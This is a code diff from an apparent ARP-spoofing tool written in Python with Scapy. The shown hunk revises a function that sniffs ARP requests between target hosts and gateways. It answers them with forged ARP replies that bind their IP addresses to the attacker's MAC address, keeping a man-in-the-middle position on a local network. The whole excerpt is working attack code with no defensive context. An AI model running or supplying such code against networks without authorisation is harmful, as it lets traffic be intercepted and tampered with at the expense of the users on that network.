@@ -134,21 +134,20 @@ def arp_poison(targets, gateways):
 def poison_confirm(targets, gateways):
     while True:
         pkt = sniff(filter="arp", iface=options.iface, count=1)[0]
-        for target in targets:
-            if(pkt[ARP].psrc == target.ip):
-                for gateway in gateways:
-                    if(pkt[ARP].pdst == gateway.ip):
-                        print("ARP broadcast detected") 
-                        # pkt.show()
-                        arpReply = forge_arp(gateway.ip, target.ip, target.mac, ATTACKER_MAC, 2)
-                        sendp(arpReply, iface=options.iface, verbose=options.verbose)
-
-            if(not options.oneway):
-                if(pkt[ARP].pdst == target.ip):
+        if(pkt[ARP].op == 1 and pkt[ARP].hwsrc != ATTACKER_MAC):
+            for target in targets:
+                if(pkt[ARP].psrc == target.ip):
                     for gateway in gateways:
-                        if(pkt[ARP].psrc == gateway.ip):
-                            arpReply = forge_arp(target.ip, gateway.ip, gateway.mac, ATTACKER_MAC, 2)
+                        if(pkt[ARP].pdst == gateway.ip):
+                            arpReply = forge_arp(gateway.ip, target.ip, target.mac, ATTACKER_MAC, 2)
                             sendp(arpReply, iface=options.iface, verbose=options.verbose)
+                            print("ARP broadcast from " + arpReply[ARP].psrc + " to " + arpReply[ARP].pdst)
+                if(not options.oneway):
+                    if(pkt[ARP].pdst == target.ip):
+                        for gateway in gateways:
+                            if(pkt[ARP].psrc == gateway.ip):
+                                arpReply = forge_arp(target.ip, gateway.ip, gateway.mac, ATTACKER_MAC, 2)
+                                sendp(arpReply, iface=options.iface, verbose=options.verbose)
 
         # print("[*] Received ARP packet:")
         # pkt.show()
